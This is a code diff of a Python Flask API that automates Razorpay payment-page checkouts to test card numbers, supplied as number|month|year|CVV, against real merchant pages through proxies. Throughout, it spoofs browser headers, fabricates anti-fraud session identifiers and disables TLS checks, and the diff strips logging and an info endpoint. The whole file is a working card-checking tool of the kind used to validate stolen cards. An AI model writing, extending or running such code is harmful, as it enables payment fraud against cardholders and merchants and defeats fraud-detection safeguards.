@@ -1,11 +1,7 @@
 from flask import Flask, request, jsonify
-import requests, random, string, hashlib, secrets, base64, json, re, time, socket, logging
+import requests, random, string, hashlib, secrets, base64, json, re, time
 from urllib.parse import urlparse, quote
 requests.packages.urllib3.disable_warnings()
-
-# Enable logging for debugging
-logging.basicConfig(level=logging.DEBUG)
-logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 app.json.sort_keys = False
@@ -58,10 +54,6 @@ def parse_proxy(p):
     return {"http": url, "https": url}
 
 def check_site(site_url, proxy=None, cc=None):
-    logger.debug(f"Checking site: {site_url}")
-    logger.debug(f"CC: {cc}")
-    logger.debug(f"Proxy: {proxy}")
-    
     parts = cc.split("|")
     cc_num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
 
@@ -78,53 +70,28 @@ def check_site(site_url, proxy=None, cc=None):
     page_origin = urlparse(site_url).scheme + "://" + (urlparse(site_url).hostname or "pages.razorpay.com")
 
     session = requests.Session()
-    if proxy: 
-        session.proxies.update(proxy)
-        logger.debug(f"Using proxy: {proxy}")
+    if proxy: session.proxies.update(proxy)
 
-    # Get BUILD version
     try:
         js = session.get("https://checkout.razorpay.com/v1/checkout.js", verify=False, timeout=15).text
         BUILD = (m.group(1) if (m := re.search(r'g="([a-f0-9]{40})"', js)) else "afa3662e035e66c495f2ddc21c6f030530870f53")
         BUILD_V1 = (m.group(1) if (m := re.search(r'build_v1:"([a-f0-9]{40})"', js)) else "da4ee3f43a28ad81dba8ed06daf899a4520c691f")
-    except Exception as e:
-        logger.error(f"Failed to get BUILD: {e}")
+    except:
         BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
         BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
 
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
 
-    # Step 1: Get page data
-    try:
-        r = session.get(site_url, verify=False, timeout=30, headers={"Accept": "text/html,*/*", "User-Agent": ua})
-        logger.debug(f"Page status: {r.status_code}")
-        if r.status_code != 200:
-            return f"Page returned {r.status_code}"
-    except Exception as e:
-        logger.error(f"Failed to get page: {e}")
-        return f"Page fetch failed: {str(e)[:50]}"
-
+    r = session.get(site_url, verify=False, timeout=30, headers={"Accept": "text/html,*/*", "User-Agent": ua})
     m = re.search(r'var data = ({.*?});', r.text, re.DOTALL)
-    if not m:
-        logger.error("No data found in page")
-        return "page data not found"
-    
-    try:
-        init_data = json.loads(m.group(1))
-        logger.debug(f"Init data loaded: {list(init_data.keys())}")
-    except json.JSONDecodeError as e:
-        logger.error(f"JSON decode error: {e}")
-        return "Invalid JSON in page data"
-    
-    if "error_code" in init_data:
-        return str(init_data.get("message","page error"))[:200]
-    
+    if not m: return "page data not found"
+    init_data = json.loads(m.group(1))
+    if "error_code" in init_data: return str(init_data.get("message","page error"))[:200]
     kyid = init_data["key_id"]
     plink = init_data["payment_link"]["id"]
     ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
     klh = init_data.get("keyless_header", "")
     klh_url = quote(klh.encode('utf-8'), safe='')
-    
     try:
         item_amt = init_data["payment_link"]["payment_page_items"][0].get("item",{}).get("amount")
         amo = int(item_amt) if item_amt else int(init_data["payment_link"].get("min_amount_value",100))
@@ -134,7 +101,6 @@ def check_site(site_url, proxy=None, cc=None):
 
     session.cookies.set("_rzp_unified_session_id", rzp_unified_session_id, domain=".razorpay.com")
 
-    # Step 2: Create order
     h_order = {
         "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
         "Origin": page_origin, "Referer": page_origin+"/", "User-Agent": ua,
@@ -142,30 +108,17 @@ def check_site(site_url, proxy=None, cc=None):
         "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
     }
-    
-    try:
-        resp_o = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", headers=h_order,
-            json={"notes":{"comment":"", "name":name}, "line_items":[{"payment_page_item_id":ppid,"amount":amo}]},
-            verify=False, timeout=30)
-        logger.debug(f"Order response status: {resp_o.status_code}")
-        logger.debug(f"Order response: {resp_o.text[:200]}")
-    except Exception as e:
-        logger.error(f"Order creation failed: {e}")
-        return f"Order creation failed: {str(e)[:50]}"
-    
+    resp_o = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", headers=h_order,
+        json={"notes":{"comment":"", "name":name}, "line_items":[{"payment_page_item_id":ppid,"amount":amo}]},
+        verify=False, timeout=30)
     try:
         od = json.loads(resp_o.text)
-        if "error" in od:
-            return str(od["error"].get("description","order failed"))[:200]
+        if "error" in od: return str(od["error"].get("description","order failed"))[:200]
         order_id = od["order"]["id"]
         checkout_id = order_id.split("_")[1]
-        logger.debug(f"Order ID: {order_id}, Checkout ID: {checkout_id}")
-    except json.JSONDecodeError:
-        return f"Invalid order response: {resp_o.text[:100]}"
-    except Exception as e:
-        return f"Order parse error: {str(e)[:50]}"
+    except:
+        return f"HTTP {resp_o.status_code}"
 
-    # Step 3: Get session token
     h_pub = {
         "Accept": "text/html,*/*", "Referer": page_origin+"/", "User-Agent": ua,
         "Accept-Language": "en-US,en;q=0.9",
@@ -177,38 +130,22 @@ def check_site(site_url, proxy=None, cc=None):
         "checkout_v2": "1", "new_session": "1", "keyless_header": klh,
         "rzp_device_id": rzp_device_id, "unified_session_id": rzp_unified_session_id,
     }
-    
-    try:
-        r_pub = session.get("https://api.razorpay.com/v1/checkout/public", params=params_pub, headers=h_pub, verify=False, timeout=30)
-        logger.debug(f"Public response status: {r_pub.status_code}")
-    except Exception as e:
-        logger.error(f"Public fetch failed: {e}")
-        return f"Public fetch failed: {str(e)[:50]}"
-    
+    r_pub = session.get("https://api.razorpay.com/v1/checkout/public", params=params_pub, headers=h_pub, verify=False, timeout=30)
     sessid = (m.group(1) if (m := re.search(r'window.session_token="([^"]+)"', r_pub.text)) else "")
     if not sessid:
         m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', r_pub.text)
         if m: sessid = m.group(1)
-    if not sessid:
-        logger.error("No session token found")
-        return "session_token not found"
-    logger.debug(f"Session token: {sessid[:20]}...")
+    if not sessid: return "session_token not found"
 
-    # Step 4: Preferences
     h_pref = {
         "Accept": "*/*", "Content-type": "application/json", "Origin": "https://api.razorpay.com",
         "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
         "User-Agent": ua, "x-session-token": sessid,
     }
-    try:
-        session.post("https://api.razorpay.com/v2/standard_checkout/preferences",
-            params={"x_entity_id":order_id,"session_token":sessid,"keyless_header":klh},
-            headers=h_pref, data=json.dumps({"identifiers":{},"action":"get"}), verify=False, timeout=30)
-        logger.debug("Preferences sent")
-    except Exception as e:
-        logger.error(f"Preferences failed: {e}")
+    session.post("https://api.razorpay.com/v2/standard_checkout/preferences",
+        params={"x_entity_id":order_id,"session_token":sessid,"keyless_header":klh},
+        headers=h_pref, data=json.dumps({"identifiers":{},"action":"get"}), verify=False, timeout=30)
 
-    # Step 5: Checkout order
     h_co = {
         "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com",
         "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
@@ -229,21 +166,10 @@ def check_site(site_url, proxy=None, cc=None):
         "_[shield][browser]":"chrome","_[request_index]":"0","amount":amo,
         "order_id":order_id,"method":"card","checkout_id":checkout_id,
     }
-    
-    try:
-        r_co = session.post("https://api.razorpay.com/v1/standard_checkout/checkout/order", params=params_co, headers=h_co, data=data_co, verify=False, timeout=30)
-        logger.debug(f"Checkout order status: {r_co.status_code}")
-        logger.debug(f"Checkout order response: {r_co.text[:200]}")
-    except Exception as e:
-        logger.error(f"Checkout order failed: {e}")
-        return f"Checkout order failed: {str(e)[:50]}"
-    
-    try: 
-        coid_local = json.loads(r_co.text).get("checkout_id", checkout_id)
-    except: 
-        coid_local = checkout_id
+    r_co = session.post("https://api.razorpay.com/v1/standard_checkout/checkout/order", params=params_co, headers=h_co, data=data_co, verify=False, timeout=30)
+    try: coid_local = json.loads(r_co.text).get("checkout_id", checkout_id)
+    except: coid_local = checkout_id
 
-    # Step 6: Cross border flow
     h_cb = {
         "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua, "x-session-token": sessid,
         "Origin": "https://api.razorpay.com",
@@ -253,13 +179,8 @@ def check_site(site_url, proxy=None, cc=None):
         "identifiers": {"merchant":{"country":"IN"},"card":{"country":"US","dcc_blacklist":False,"network":"visa"},"method":"card","payment_currency":"INR"},
         "forex_charges": {"amount":amo,"currency":"INR","filters":{"method":"card"}}
     }
-    try:
-        session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={klh_url}", headers=h_cb, json=payload_cb, verify=False, timeout=30)
-        logger.debug("Cross border sent")
-    except Exception as e:
-        logger.error(f"Cross border failed: {e}")
+    session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={klh_url}", headers=h_cb, json=payload_cb, verify=False, timeout=30)
 
-    # Step 7: Create payment
     token_create = base64.b64encode(json.dumps([
         {"name":"sardine","metadata":{"session_id":coid_local}},
         {"name":"stripe_radar","metadata":{"session_id":"rse_"+''.join(secrets.choice(string.ascii_letters+string.digits) for _ in range(22))}}
@@ -289,14 +210,7 @@ def check_site(site_url, proxy=None, cc=None):
         "save":"0",
     }
 
-    try:
-        r_final = session.post("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax", params=params_create, headers=h_create, data=data_create, verify=False, timeout=30)
-        logger.debug(f"Final response status: {r_final.status_code}")
-        logger.debug(f"Final response: {r_final.text[:300]}")
-    except Exception as e:
-        logger.error(f"Final payment failed: {e}")
-        return f"Payment failed: {str(e)[:50]}"
-    
+    r_final = session.post("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax", params=params_create, headers=h_create, data=data_create, verify=False, timeout=30)
     txt = r_final.text
 
     try:
@@ -310,40 +224,11 @@ def check_site(site_url, proxy=None, cc=None):
         pass
     return txt[:200]
 
-@app.route("/info", methods=["GET"])
-def server_info():
-    try:
-        hostname = socket.gethostname()
-        private_ip = socket.gethostbyname(hostname)
-    except:
-        hostname = "Unknown"
-        private_ip = "Unknown"
-    
-    try:
-        public_ip = requests.get("https://api.ipify.org", timeout=5).text
-    except:
-        public_ip = "Unknown"
-    
-    return jsonify({
-        "hostname": hostname,
-        "private_ip": private_ip,
-        "public_ip": public_ip,
-        "port": 8080,
-        "status": "running",
-        "dev": show_base(base),
-        "endpoints": {
-            "razorpay": "/razorpay?site=URL&cc=CC&proxy=PROXY",
-            "info": "/info"
-        }
-    })
-
 @app.route("/razorpay", methods=["GET"])
 def razorpay():
     site = request.args.get("site", "").strip()
     cc = request.args.get("cc", "").strip()
     proxy_str = request.args.get("proxy", "").strip()
-
-    logger.info(f"Request: site={site[:50]}, cc={cc[:20]}..., proxy={proxy_str[:30]}...")
 
     if not site:
         return jsonify({"CC": cc, "Response": "Site is required", "Site": site, "Time": "0s", "Dev": base}), 400
@@ -360,7 +245,6 @@ def razorpay():
     try:
         msg = check_site(site, proxy, cc)
     except Exception as e:
-        logger.error(f"Exception: {e}")
         msg = str(e)
     elapsed = f"{round(time.time() - start, 2)}s"
 
@@ -373,26 +257,10 @@ def razorpay():
     })
 
 if __name__ == "__main__":
-    import sys
+    import logging, sys
     try: sys.stdout.reconfigure(encoding="utf-8")
     except Exception: pass
-    
-    print("=" * 50, flush=True)
+    logging.getLogger("werkzeug").setLevel(logging.ERROR)
     print("𝗔𝗣𝗜 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...", flush=True)
-    try:
-        hostname = socket.gethostname()
-        private_ip = socket.gethostbyname(hostname)
-        print(f"📍 Private IP: {private_ip}", flush=True)
-        try:
-            public_ip = requests.get("https://api.ipify.org", timeout=5).text
-            print(f"📍 Public IP: {public_ip}", flush=True)
-        except:
-            pass
-    except:
-        pass
-    print(f"📍 Port: 8080", flush=True)
-    print(f"📍 Info: http://0.0.0.0:8080/info", flush=True)
-    print("=" * 50, flush=True)
-    
     from werkzeug.serving import run_simple
     run_simple("0.0.0.0", 8080, app, threaded=True)
